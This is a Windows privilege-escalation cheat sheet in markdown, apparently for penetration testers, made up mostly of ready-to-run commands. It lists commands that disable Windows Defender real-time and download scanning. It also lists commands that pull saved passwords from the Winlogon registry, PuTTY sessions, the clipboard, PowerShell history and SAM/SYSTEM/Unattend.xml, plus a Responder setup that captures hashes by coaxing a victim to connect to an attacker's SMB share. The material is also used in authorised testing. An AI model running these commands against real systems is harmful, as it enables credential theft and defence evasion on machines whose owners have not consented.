
Always good to run [PEASS-ng](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

For more detailed guide, see [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)

# Windows privilege escalation

- [General info](#general-info)
    - [System](#system)
    - [Environment](#environment)
    - [Ports](#ports)
- [If you have admin privileges](#if-you-have-admin-privileges)
- [Credentials](#credentials)
    - [Common credential locations](#common-credential-locations)
    - [Responder capture hashes](#responder-capture-hashes)
- [Services](#services)

# General info

```PowerShell
# CMD
net users %username% # Me
net users # All local users
net localgroup # Groups
net localgroup Administrators # Who is inside Administrators group
whoami /all # Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
## System

``` Powershell
# System information
systeminfo
[System.Environment]::OSVersion.Version #Current OS version
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches

# PowerShell history
ConsoleHost_history #Find the PATH where is saved
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# Powershell logs
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

Note: Check [this site](https://msrc.microsoft.com/update-guide/vulnerability) for vulnerabilities.
## Environment

```PowerShell
# Credentials saved in env variables?
env
dir env:
Get-ChildItem Env: | ft Key,Value
```
## Ports

```powershell
netstat -ano
```
# If you have admin privileges

```powershell
# Disable Windows Defender real time monitoring
Set-MpPreference -DisableRealTimeMonitoring $true

# Disable Windows Defender scanning for downloaded files
Set-MpPreference -DisableIOAVProtection $true
```
# Credentials

## Common credential locations

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there

# Maybe in the clipboard?
powershell -command "Get-Clipboard"

# May contain creds
dir /s SAM
dir /s SYSTEM
dir /s Unattend.xml
```
## Capture hashes (Responder)

**KALI**
```bash
sudo responder -I tun0 # Wait for hash and crack
```

**WINDOWS**
```powershell
# Get it to connect to your server
# e.g. smb
copy \\ip\test\file
```
# Services

```powershell
# Get a list of services
net start
wmic service list brief
sc query
Get-Service

# Get info of service
sc qc <service_name>
```


